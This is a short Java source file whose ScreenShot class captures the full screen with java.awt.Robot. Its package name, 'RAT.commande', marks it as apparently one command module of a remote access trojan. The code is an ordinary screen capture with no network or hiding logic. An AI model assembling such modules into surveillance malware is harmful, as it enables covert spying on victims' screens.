package RAT.commande;

import java.awt.*;
import java.awt.image.BufferedImage;

public class ScreenShot  {
    static public BufferedImage printScreen() {
        try {
            return new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        } catch (AWTException e) {
            e.printStackTrace();
        }
        return null;
    }

}